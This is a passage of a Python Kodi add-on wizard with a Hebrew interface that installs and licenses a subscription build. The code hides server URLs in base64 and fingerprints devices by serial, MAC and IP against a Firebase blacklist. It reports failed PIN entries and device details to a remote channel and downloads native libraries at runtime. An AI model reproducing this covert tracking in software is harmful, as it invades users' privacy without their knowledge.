# coding: utf-8

import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob,random,urllib,re,time,json,subprocess,zipfile
import shutil,logging,uservar,platform,base64,hashlib

# socket.setdefaulttimeout(10)
from urllib.request import urlopen
from urllib.request import Request
from shutil import copyfile
import threading
from threading import Thread
from datetime import date, datetime, timedelta
from urllib.parse import parse_qsl
from resources.libs.main import set_fastupdate_date,totalClean,clearPackagesStartup,backtokodi,fix_gui,resetkodi,SetAddonDisables
que=urllib.parse.quote_plus
url_encode=urllib.parse.urlencode
unque=urllib.parse.unquote_plus
translatepath=xbmcvfs.translatePath
from resources.libs.wizard import platform_d,user_info_Window
from resources.libs import extract, downloader,notify
from resources.libs import wizard as wiz
code_link='empty'
ADDON_ID         = uservar.ADDON_ID
ADDONTITLE       = uservar.ADDONTITLE
ADDON            = wiz.addonId(ADDON_ID)
VERSION          = wiz.addonInfo(ADDON_ID,'version')
ADDONPATH        = wiz.addonInfo(ADDON_ID,'path')
DIALOG           = xbmcgui.Dialog()
DP               = xbmcgui.DialogProgress()
HOME             = translatepath('special://home/')
ADDONS           = os.path.join(HOME,      'addons')
PACKAGES         = os.path.join(ADDONS,    'packages')
FANART           = os.path.join(ADDONPATH, 'fanart.jpg')
ICON             = os.path.join(ADDONPATH, 'icon.png')
DP2              = xbmcgui.DialogProgressBG()
BUILDNAME        = wiz.getS('buildname')
BUILDVERSION     = wiz.getS('buildversion')
BUILDLATEST      = wiz.getS('latestversion')
NOTIFY           = wiz.getS('notify')
NOTEDISMISS      = wiz.getS('notedismiss')
NOTEID           = wiz.getS('noteid')
NOTEID         = 0 if NOTEID == "" else int(NOTEID)
HARDWAER         = wiz.getS('action')
TODAY            = date.today()
TOMORROW         = TODAY + timedelta(days=1)
THREEDAYS        = TODAY + timedelta(days=3)
ONEWEEK        = TODAY + timedelta(days=7)
MONTH        = TODAY - timedelta(days=2)
LASTONEWEEK        = TODAY - timedelta(days=7)
KODIV            = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
EXCLUDES         = uservar.EXCLUDES
APKFILE          = uservar.APKFILE
UPDATECHECK      = uservar.UPDATECHECK if str(uservar.UPDATECHECK).isdigit() else 1
NEXTCHECK        = TODAY + timedelta(days=UPDATECHECK)
NOTIFICATION     = uservar.NOTIFICATION
TMDB_NEW_API     = uservar.TMDB_NEW_API
COLOR1           = uservar.COLOR1
COLOR2           = uservar.COLOR2
THEME1           = uservar.THEME1
THEME2           = uservar.THEME2
THEME3           = uservar.THEME3
ICONBUILDS       = uservar.ICONBUILDS if not uservar.ICONBUILDS == 'http://' else ICON


fullsecfold=translatepath('special://home')
code_link='empty'
addons_folder=os.path.join(fullsecfold,'addons')
remove_url = base64.b64decode('aHR0cDovL2RpZ2l0LnNlZWRob3N0LmV1L2tvZGkvd2l6YXJkL3R4dC9yZW1vdmVfYWRkb25zLnhtbA==').decode('utf-8')
reset_kodi_update = base64.b64decode('aHR0cDovL2RpZ2l0LnNlZWRob3N0LmV1L2tvZGkvd2l6YXJkL3R4dC9yZXNldF9rb2RpLnhtbA==').decode('utf-8')
user_folder=os.path.join(translatepath('special://masterprofile'),'addon_data')
remove_url2 = base64.b64decode('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode('utf-8')
fanart         = translatepath(os.path.join('special://home/addons/' + ADDON_ID , 'fanart.jpg'))
icon           = translatepath(os.path.join('special://home/addons/' + ADDON_ID, 'icon.png'))
oo='/key.xml'

US = '&eJwFwVEKgEAIBcAb-f67TaCkVLjoW1r29M04OfoANK6gtJl6NsUm7tTAF_ssBRcx20rW-_zf9hME$'
server='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'
server_lib='https://digit.seedhost.eu/kodi/wizard/Tdlib/data.json'
BL ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0U9LLC4pLUhJLEnVh1B6VZkFAJ37Fps=$'
class Thread (threading.Thread):
   def __init__(self, target, *args):
    super().__init__(target=target, args=args)
   def run(self, *args):
      
      self._target(*self._args)
      return 0
def backup_setting_file():
    try:
        setting_file=os.path.join(translatepath("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")
        setting_file2=os.path.join(translatepath("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")
        file = open(setting_file, 'r', encoding='utf-8') 
        file_data= file.read()
        file.close()

        if len(file_data) >0:
            copyfile(setting_file,setting_file2)
    except:pass

def read_skin(table_name):
    from resources.libs import firebase
    firebase = firebase.FirebaseApplication(theme_nox, None)
    result = firebase.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def read_skin_dragon(table_name):
    from resources.libs import firebase
    firebase = firebase.FirebaseApplication(theme_dragon, None)
    result = firebase.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def read_skin_black(table_name):
    from resources.libs import firebase
    firebase = firebase.FirebaseApplication(black_nox, None)
    result = firebase.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def read_device(table_name):
    from resources.libs import firebase
    firebase = firebase.FirebaseApplication(serial, None)
    result = firebase.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def write_device_name(device_name,table_name):
    from resources.libs import firebase
    fb_app = firebase.FirebaseApplication(serial, None)

    result = fb_app.post(table_name, {'device_name':device_name})
    return 'OK'
def ld(url):
    import zlib
    data = url
    data.replace('$','').replace('&','')

    json_str = zlib.decompress(base64.urlsafe_b64decode(data)).decode('utf-8')
    return json_str
def check(wiz_up=False):
    import json,platform,requests
    userr=ADDON.getSetting("user")
    input2=ADDON.getSetting("pass")
    match=[]
    found=0
    serialnumber=''
    try:
        all_db=read_skin_black('lock_install')
        for itt in all_db:
            items=all_db[itt]
            match.append((items['lock_install']))
    except Exception as e:
              logging.warning('!!!!!!!!!!!!!!!!!!!!!!     '  +str(e))

    try:
        local_ip=requests.get('http://api.ipaddress.com/myip').text.strip()
    except:
        local_ip="can't get ip"
    if xbmc.getCondVisibility('system.platform.android'):
     try:
        model=subprocess.check_output(['getprop','ro.product.model'])[:-1]
        id_name=que('סוג מכשיר: ')+str(model.decode('utf-8'))
        x=subprocess.check_output(['getprop'])[:-1]
        regex='\[([0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F])\]'
        m=re.compile(regex).findall(x.decode('utf-8'))
        serialnumber=str(m).replace('[','').replace(']','').replace("'",'')
        if serialnumber =='' or serialnumber =='00:00:00:00:00:00':
            serialnumber=subprocess.check_output(['getprop','ril.serialnumber'])[:-1].decode('utf-8')
            if serialnumber =='':
                serialnumber=subprocess.check_output(['getprop','ro.serialno'])[:-1].decode('utf-8')
            if serialnumber =='':
                digest=subprocess.check_output(['getprop','ro.boot.vbmeta.digest'])[:-1]
                m = hashlib.md5()
                m.update(digest)
                serialnumber='R'+str(int(m.hexdigest(), 16))[0:12]
        serialnumber=userr+' '+str(model.decode('utf-8'))+': '+str(serialnumber)
     except Exception as e:
        logging.warning('32323232323232323 '+str(e))
    else: 
        serialnumber = platform.uname()[1]
        serialnumber=userr+' '+'pc: '+str(serialnumber)
    info_name=''
    pin= (ADDON.getSetting("action"))
    wizz=''
    
    if wiz_up:
        wizz='wizard_update'
    for i in match:
        
        if i == local_ip:
            info_name='ip'
            found=1
            break
        if i == serialnumber:
            name='system_name'
            found=1
            break
        if i == pin:
            info_name='hardware_code'
            found=1
            break
        if i==userr:
            info_name='username'
            found=1
            break
        if i==input2:
            info_name='password'
            found=1
            break
        if i.lower() == serialnumber.lower().replace(' ',''):
            name='mac_name'
            found=1
            break
    if found==1:
       passw = base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3F0VVlheXZj").decode('utf-8')
       remote_pass = urlopen(passw)
       xx=remote_pass.readlines()
       xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
       if not wiz_up:
        if BUILDNAME == "":
            send_user_info('channel_new_install','חסימה על ידי: '+info_name+wizz)
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]סיסמה לא נכונה.[/COLOR]' % COLOR2,1500)
            ADDON.openSettings()
       sys.exit()

def read_firebase_c(table_name):
    from resources.libs import firebase
    fire = firebase.FirebaseApplication('https://zxcsd-3bae5-default-rtdb.firebaseio.com', None)
    result = fire.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def telecode():
    all_db=read_firebase_c('telecode')
    data=[]
    for itt in all_db:
        items=all_db[itt]
        data.append((items['pin']))
    for pin in data:
       return pin

theme_nox='https://zxcsd-3bae5-default-rtdb.firebaseio.com'
theme_dragon='https://dragon-user-default-rtdb.firebaseio.com'
black_nox='https://blacklist-user-default-rtdb.firebaseio.com'
serial='https://device-name-id-default-rtdb.firebaseio.com'
def addItem(name, url, mode, iconimage, fanart, description=None):
    if description == None: description = ''
    description = '[COLOR white]' + description + '[/COLOR]'
    u=sys.argv[0]+"?url="+que(url)+"&mode="+str(mode)+"&name="+que(name)+"&iconimage="+que(iconimage)+"&fanart="+que(fanart)
    ok=True
    try:
        liz=xbmcgui.ListItem(name, iconImage=iconimage, thumbnailImage=iconimage)
    except:
        liz=xbmcgui.ListItem(name)
        liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'DefaultFolder.png': iconimage})
    liz.setInfo( type="Video", infoLabels={ "Title": name, "Plot": description } )
    liz.setProperty( "fanart_Image", fanart )
    liz.setProperty( "icon_Image", iconimage )
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    return ok

def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        try:
          dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        except:
          dec_c = chr((256 + (enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):
    value=decode("7643",url)
    return int(value)
def check_pass_step2(pin):
    match=[]
    found2=0
    try:
        all_db=read_skin('password')
        for itt in all_db:
            items=all_db[itt]
            match.append((items['password']))
    except Exception as e:
              logging.warning('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '  +str(e))
    for i in match:

        if i.split()[0].lower()==pin:
            found2=1
            break
    if found2==0:
        return ''
    return 'ok'
def check_id(write_device=''):
    found2=0
    device_name=read_device('playback')
    serialnumber=''
    userr=wiz.getS("user").lower()
    
    if xbmc.getCondVisibility('system.platform.android'):
     import subprocess
     try:
        model=subprocess.check_output(['getprop','ro.product.model'])[:-1]
        id_name=que('סוג מכשיר: ')+str(model.decode('utf-8'))
        x=subprocess.check_output(['getprop'])[:-1]
        regex='\[([0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F])\]'
        m=re.compile(regex).findall(x.decode('utf-8'))
        serialnumber=str(m).replace('[','').replace(']','').replace("'",'')
        if serialnumber =='' or serialnumber =='00:00:00:00:00:00':
            serialnumber=subprocess.check_output(['getprop','ril.serialnumber'])[:-1].decode('utf-8')
            if serialnumber =='':
                serialnumber=subprocess.check_output(['getprop','ro.serialno'])[:-1].decode('utf-8')
            if serialnumber =='':
                digest=subprocess.check_output(['getprop','ro.boot.vbmeta.digest'])[:-1]
                m = hashlib.md5()
                m.update(digest)
                serialnumber='R'+str(int(m.hexdigest(), 16))[0:12]
        serialnumber=userr+' '+str(model.decode('utf-8'))+': '+str(serialnumber)
     except Exception as e:
        logging.warning('32323232323232323 '+str(e))
    else:
        xs = platform.uname()[1]
        serialnumber=userr+' '+'pc: '+xs
    if write_device=='false':
        for items in device_name:
             if device_name[items]['device_name'].lower()==serialnumber.lower():
                if xbmc.getCondVisibility('system.platform.android'):
                    wiz.setS('serialnumber',model)
                else:
                    wiz.setS('serialnumber','pc: '+xs)
                found2=1
                break
        if found2==0:

            thread=[]
            thread.append(Thread(send_user_info,'channel_new_install','מזהה מכשיר'))
            thread[0].start()
            return ''
    count=0
    d_name=[]
    if write_device=='true':
        x=False
        for items in device_name:
             if device_name[items]['device_name']==serialnumber.lower():
                
                x=True
                return
             if userr == device_name[items]['device_name'].partition(' ')[0]:
                d_name.append(device_name[items]['device_name'].replace(device_name[items]['device_name'].partition(' ')[0],''))

                count+=1
        if wiz.getS("dragon") =='true':
           if count>=2:
                thread=[]
                thread.append(Thread(send_user_info,'channel_new_install','מעוניין לרשום מכשיר'))
                thread[0].start()
                ret = xbmcgui.Dialog().multiselect("הגעת למספר מקסימלי של מכשירים שרשומים אצלנו במערכת.", d_name)
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                sys.exit()
        else:
            if count>=3:
                thread=[]
                thread.append(Thread(send_user_info,'channel_new_install','מעוניין לרשום מכשיר'))
                thread[0].start()

                ret = xbmcgui.Dialog().multiselect("הגעת למספר מקסימלי של מכשירים שרשומים אצלנו במערכת.", d_name)
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                sys.exit()
        if x == False:

            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]מכשיר זה נרשם במערכת בהצלחה![/COLOR]" % COLOR2,1500)
            thread=[]
            thread.append(Thread(send_user_info,'channel_new_install','מכשיר נרשם במערכת.'))
            thread[0].start()
            if xbmc.getCondVisibility('system.platform.android'):
                wiz.setS('serialnumber',model)
            else:
                wiz.setS('serialnumber','pc: '+xs)
            write_device_name(serialnumber.lower(),'playback')
    return 'ok'
                
def check_pass():#חומרה
    if check_id('false')=='ok':
        return 'ok'
    search_entered=wiz.getS("pass")
    HARDWAER=wiz.getS('action')
    if not len(wiz.getS("pass"))>0:
        dialog = xbmcgui.Dialog()
        search_entered = dialog.numeric(0, 'הכנס סיסמה - ' + 'קוד מכשיר: '+'[COLOR yellow]'+HARDWAER+'[/COLOR]')

        wiz.setS("pass",search_entered)
        if search_entered=='':
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            sys.exit()
    pin= search_entered
    if xbmc.getCondVisibility('system.platform.windows') or xbmc.getCondVisibility('system.platform.android'):

        from math import sqrt
        my_tmdb=tmdb_list(TMDB_NEW_API)
        try:
            num=str((getHwAddr('eth0'))*my_tmdb)
            new_num=int(num[1]+num[2]+num[5]+num[7])
            new_num2=(str( round(sqrt((new_num*500)+30)+30,4))[-4:]).replace('.','')
        
            if '.' in new_num2:
             new_num2=(str( round(sqrt((new_num*500)+30)+30,4))[-5:]).replace('.','')
        except:
             new_num=''
             new_num2=''
        if pin==new_num2:
            check_id('true')
            # xbmc.executebuiltin('Container.Refresh')
            return 'ok'
        elif check_pass_step2(pin) =='ok':
             check_id('true')
             # xbmc.executebuiltin('Container.Refresh')
             return 'ok'
        else:
            wiz.setS("pass",'')
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]סיסמה שגויה[/COLOR]" % COLOR2,1500)
            thread=[]
            thread.append(Thread(send_user_info,'channel_new_install','סיסמה שגויה - '+pin))
            thread[0].start()
            # xbmc.executebuiltin('Container.Refresh')
            sys.exit()
        return 'ok'

    else:
           if check_pass_step2(pin) =='ok':
             check_id('true')
             return 'ok'
           else:
             xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

def download_file(url,path):
    if not os.path.exists(path): os.makedirs(path)#יוצר את התיקיה של הטלמדיה
    import requests
    local_filename = url.split('/')[-1]
    if '?' in local_filename:
        local_filename=local_filename.split('?')[0]
    local_filename=os.path.join(path,local_filename)
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            start_time = time.time()
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
    return local_filename

def tdlib():
    import requests
    import platform
    machine= (platform.machine())
    platform= (platform.architecture())
    if sys.platform.lower().startswith('linux'):
        plat = 'linux'
        if 'ANDROID_DATA' in os.environ:
            plat = 'android'
    elif sys.platform.lower().startswith('win'):
        plat = 'windows'
    elif sys.platform.lower().startswith('darwin'):
        plat = 'darwin'
    else:
        plat = None
    from zipfile import ZipFile
    cur=os.path.join(translatepath("special://home/"),"addons","plugin.video.telemedia")
    cur=os.path.join(cur,'resources','lib')
    x=requests.get(server_lib).json()
    user_dataDir = xbmcvfs.translatePath(ADDON.getAddonInfo("profile"))
    download_file(server_lib,user_dataDir)
    if plat == 'android':
            if platform[0]=='32bit':
                url=x['android32']
                cur=os.path.join(cur,"android/armeabi-v7a")
                download_file(url,cur)
            else:
                url=x['android64']
                cur=os.path.join(cur,"android/arm64-v8a")
                download_file(url,cur)
    elif plat == 'windows':
        if platform[0]=='64bit':
            cur=os.path.join(cur,'windows/x64')
            download_file(x['windows64'],cur)
            file_windows=os.path.join(cur,'windows64.zip')
            zf = ZipFile(file_windows)
            for file in zf.infolist():
                zf.extract(member=file, path=cur)
            zf.close()
            time.sleep(1)
            try:
                os.remove(file_windows)
            except:
                pass
        else:
            cur=os.path.join(cur,'windows/x32')
            download_file(x['windows32'],cur)
            file_windows=os.path.join(cur,'windows32.zip')
            zf = ZipFile(file_windows)
            for file in zf.infolist():
                zf.extract(member=file, path=cur)
            zf.close()
            time.sleep(1)
            try:
                os.remove(file_windows)
            except:
                pass
    elif plat == 'linux':
            if platform[0]=='32bit':
                url=x['linux32']
                cur=os.path.join(cur,"linux/x32")
                download_file(url,cur)
            else:
                url=x['linux64']
                cur=os.path.join(cur,"linux/x64")
                download_file(url,cur)
    elif plat == 'darwin':
                cur=os.path.join(cur,'mac/mac-os')
                download_file(x['mac'],cur)
                file_mac=os.path.join(cur,'libtdjson.zip')
                zf = ZipFile(file_mac)
                for file in zf.infolist():
                    zf.extract(member=file, path=cur)
                zf.close()
                time.sleep(1)
                try:
                    os.remove(file_mac)
                except:
                    pass

def getHwAddr (ifname ):

   if xbmc .getCondVisibility ('system.platform.android'):
        import logging
        try:
            import subprocess
            n =0
            x=subprocess.check_output(['getprop'])[:-1]
            regex='\[([0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F])\]'
            m=re.compile(regex).findall(x.decode('utf-8'))
            serialnumber=str(m).replace('[','').replace(']','').replace("'",'')
            if serialnumber =='' or serialnumber =='00:00:00:00:00:00':
                serialnumber=subprocess.check_output(['getprop','ril.serialnumber'])[:-1].decode('utf-8')
                if serialnumber =='':
                    serialnumber=subprocess.check_output(['getprop','ro.serialno'])[:-1].decode('utf-8')
                    m = hashlib.md5()
                    m.update(serialnumber.encode('utf-8'))
                    serialnumber=str(int(m.hexdigest(), 16))[0:12]
                if serialnumber =='':
                    digest=subprocess.check_output(['getprop','ro.boot.vbmeta.digest'])[:-1]
                    m = hashlib.md5()
                    m.update(digest)
                    serialnumber=str(int(m.hexdigest(), 16))[0:12]
                else:
                    m = hashlib.md5()
                    m.update(serialnumber.encode('utf-8'))
                    serialnumber=str(int(m.hexdigest(), 16))[0:12]
            else:
                    m = hashlib.md5()
                    m.update(serialnumber.encode('utf-8'))
                    serialnumber=str(int(m.hexdigest(), 16))[0:12]
            return serialnumber
        except Exception as e:
            logging.warning('32323232serialnumber323232323 '+str(e))
   elif xbmc .getCondVisibility ('system.platform.windows'):
       x =0 
       n =0 
       macs =[]
       file =os .popen ("getmac").read ()
       file =file .split ("\n")
       for line in file :
            found =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',line ,re .I )
            if found :
                mac =found .group ().replace ('-',':')
                macs .append (mac )
                n =n +int (mac .replace (':',''),16 )
                
                break

   else :
        # n =wiz.getS('action2')

       n =0 
       from uuid import getnode as get_mac
       n =get_mac()

   try:
    return n
   except: pass



def read_firebase_c(table_name):
    from resources.libs import firebase
    fire = firebase.FirebaseApplication('https://zxcsd-3bae5-default-rtdb.firebaseio.com', None)
    result = fire.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def readcode():
    all_db=read_firebase_c('build_link')
    data=[]
    for itt in all_db:
        items=all_db[itt]
        data.append((items['link']))
    for link in data:
       return link

def buildMenu():
    if KODIV >= 20: # קודי 20
        if BUILDNAME == "":
            addFile('התקנה'   , 'install', " Kodi Premium", 'fresh'  , description='', fanart=FANART, icon=ICONBUILDS, themeit=THEME1)
            
        else:
            addFile('התקנה מחדש'   , 'install', " Kodi Premium", 'fresh'  , description='', fanart=FANART, icon=ICONBUILDS, themeit=THEME1)
        addFile('הגדרות'   , 'passandUsername', " Kodi Premium", 'passandUsername'  ,  themeit=THEME1)
        addFile('קוד מכשיר: [COLOR yellow]%s [/COLOR]' % (HARDWAER), '', icon=ICONBUILDS, themeit=THEME1)
        addFile('לעזרה בטלגרם לחצו כאן', 'help_install', icon=ICONBUILDS, themeit=THEME1)
    else:
        DIALOG.ok(ADDONTITLE, 'ההתקנה זמינה מקודי 20 ומעלה' +'\n'+' גרסת הקודי שלך היא: '+str(KODIV))
        sys.exit()


def skin_homeselect():
    try:
        setting_file=os.path.join(translatepath("special://masterprofile/"),"addon_data", "skin.anonymoustv","settings.xml")
        file = open(setting_file, 'r', encoding='utf-8') 
        file_data= file.read()
        file.close()
        # try:
        regex='<setting id="firsttimerun" type="bool">(.+?)</setting>'
        m=re.compile(regex).findall(file_data)[0]
        file = open(setting_file, 'w', encoding='utf-8') 
        file.write(file_data.replace('<setting id="firsttimerun" type="bool">%s</setting>'%m,'<setting id="firsttimerun" type="bool">false</setting>'))
        file.close()
    except:pass
def skin_dragon_set():
    try:
        setting_file=os.path.join(translatepath("special://masterprofile/"),"addon_data", "skin.anonymoustv","settings.xml")
        file = open(setting_file, 'r', encoding='utf-8') 
        file_data= file.read()
        file.close()
        # try:
        regex='<setting id="homemenunocustom4button" type="bool">(.+?)</setting>'
        m=re.compile(regex).findall(file_data)[0]
        file = open(setting_file, 'w', encoding='utf-8') 
        file.write(file_data.replace('<setting id="homemenunocustom4button" type="bool">%s</setting>'%m,'<setting id="homemenunocustom4button" type="bool">false</setting>'))
        file.close()
    except:pass

def get_link(code_link):
    #VIP
    stop_time = time.time() + 30
    while(code_link=='empty' or code_link==None):
          wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Anonymous TV'),'[COLOR %s]ממתין לאישור...[/COLOR]' % COLOR2,1500)
          
          code_link=readcode()
          if time.time() > stop_time:
          
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אין מענה[/COLOR]' % COLOR2,1500)
            sys.exit()
            break
    return code_link



def check_userdate():
    userdate=wiz.getS("date_user")
    import datetime
    if not userdate=='':
        date = userdate.split('.')
        user_date=datetime.date(int(date[2]),int(date[1]),int(date[0])) 
        if wiz.getS("check_user")=='true':
          if str(TODAY) >= str(user_date):
             wiz.setS("check_user",'false')
             if BUILDNAME == " Kodi Premium":
                 # Account_Send(que(' מנוי הסתיים - התקנה פעילה '),userdate)
                 send_user_info('channel_block_build',' מנוי הסתיים - התקנה פעילה ')
        if str(user_date) > str(TODAY) :
             wiz.setS("check_user",'true')
        else:
            if not xbmc.Player().isPlaying():

              if os.path.exists(os.path.join(ADDONS, 'skin.Premium.mod')):
                    try:
                        setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")
                        file = open(setting_file, 'r', encoding='utf-8') 
                        file_data= file.read()
                        file.close()
                        regex='<setting id="username" type="bool(.+?)/setting>'
                        m=re.compile(regex).findall(file_data)[0]
                        if 'false' in m:
                             xbmc.executebuiltin( "Skin.ToggleSetting(username)" )
                             if wiz.getS('dragon')=='true':
                                wiz.contact_wiz('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש יש לפנות למנהלים')
                             else:
                               wiz.contact_wiz('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')
                             
                             xbmc.executebuiltin( "ActivateWindow(home)" )
                             xbmc.executebuiltin("ReloadSkin()")
                             # Account_Send(que('מנוי ננעל'),userdate)
                             send_user_info('channel_block_build','מנוי ננעל')
                    except:pass
              if os.path.exists(os.path.join(ADDONS, 'skin.anonymoustv')):
                    setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.anonymoustv","settings.xml")
                    file = open(setting_file, 'r', encoding='utf-8') 
                    file_data= file.read()
                    file.close()
                    regex='<setting id="username" type="bool(.+?)/setting>'
                    m=re.compile(regex).findall(file_data)[0]
                    if 'false' in m:
                         xbmc.executebuiltin( "Skin.ToggleSetting(username)" )
                         if wiz.getS('dragon')=='true':
                            wiz.contact_wiz('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש יש לפנות למנהלים')
                         else:
                           wiz.contact_wiz('תקופת המנוי הסתיימה, \nהמערכת לא תתעדכן יותר\nלחידוש לשנה נוספת יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')
                         
                         xbmc.executebuiltin( "ActivateWindow(home)" )
                         xbmc.executebuiltin("ReloadSkin()")
                         # Account_Send(que('מנוי ננעל'),userdate)
                         send_user_info('channel_block_build','מנוי ננעל')
                         
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            if BUILDNAME == "":
              if wiz.getS('dragon')=='true':
                wiz.contact_wiz('החשבון לא פעיל, \nיש לפנות למנהלים  ')
              else:
                wiz.contact_wiz('החשבון לא פעיל, \nיש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')
              # Account_Send(que(' מנוי הסתיים - התקנה חדשה'),userdate)
              send_user_info('channel_block_build','מנוי הסתיים - התקנה חדשה')
            sys.exit()
        
        if wiz.getS("check_user")=='true':
            if str(ONEWEEK) > str(user_date):
             if not xbmc.Player().isPlaying():
                show_alert=wiz.getS("show_alert")
                if show_alert=='true': 
                    wiz.setS("show_alert",'false')
                    send_user_info('channel_block_build','מנוי עומד להסתיים')
                    if BUILDNAME == " Kodi Premium":
                        if wiz.getS('dragon')=='true':
                            wiz.contact_wiz("תקופת המנוי שלכם תסתיים בתאריך: "+'[COLOR red]'+userdate+'[/COLOR]'+'\n'+ 'לחידוש יש לפנות למנהלים.')
                        else:
                            wiz.contact_wiz("תקופת המנוי שלכם תסתיים בתאריך: "+'[COLOR red]'+userdate+'[/COLOR]'+'\n'+ 'לחידוש לשנה נוספת יש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n [COLOR red]https://t.me/xbmc19[/COLOR]')
                wiz.LogNotify3("[COLOR %s]%s[/COLOR]" % ('yellow', "המנוי שלך עומד להסתיים בתאריך "+userdate),'[COLOR %s]https://t.me/xbmc19[/COLOR] :לחידוש יש לפנות ל' % COLOR2)
            else:
                wiz.setS("show_alert",'true')
def check_platform():
    if xbmc.getCondVisibility('system.platform.android') or xbmc.getCondVisibility('system.platform.windows'):
        import platform
        my_system = platform.uname()
        xs=my_system[1]
        if wiz.getS("set_platform_name")=='false':
            wiz.setS("platform_name",xs)
            wiz.setS("set_platform_name",'true')
        if not wiz.getS("platform_name")==xs and not wiz.getS("platform_name")=='':
          if os.path.exists(os.path.join(ADDONS, 'skin.Premium.mod')):
                try:
                    setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")
                    file = open(setting_file, 'r', encoding='utf-8') 
                    file_data= file.read()
                    file.close()
                    regex='<setting id="username" type="bool(.+?)/setting>'
                    m=re.compile(regex).findall(file_data)[0]
                    if 'false' in m:
                         xbmc.executebuiltin( "Skin.ToggleSetting(username)" )
                         wiz.contact_wiz('התקנה לא חוקית, \nיש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')
                         xbmc.executebuiltin( "ActivateWindow(home)" )
                         xbmc.executebuiltin("ReloadSkin()")
                         send_user_info('channel_block_build','ניסיון העתקה - מנוי ננעל')
                except:pass
          if os.path.exists(os.path.join(ADDONS, 'skin.anonymoustv')):
                setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.anonymoustv","settings.xml")
                file = open(setting_file, 'r', encoding='utf-8') 
                file_data= file.read()
                file.close()
                regex='<setting id="username" type="bool(.+?)/setting>'
                m=re.compile(regex).findall(file_data)[0]
                if 'false' in m:
                     xbmc.executebuiltin( "Skin.ToggleSetting(username)" )
                     wiz.contact_wiz('התקנה לא חוקית, \nיש לסרוק את הברקוד \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')
                     xbmc.executebuiltin( "ActivateWindow(home)" )
                     xbmc.executebuiltin("ReloadSkin()")
                     send_user_info('channel_block_build','ניסיון העתקה - מנוי ננעל')



def STARTP(new_install='false'):
    make_setting_file()
    continuex=False
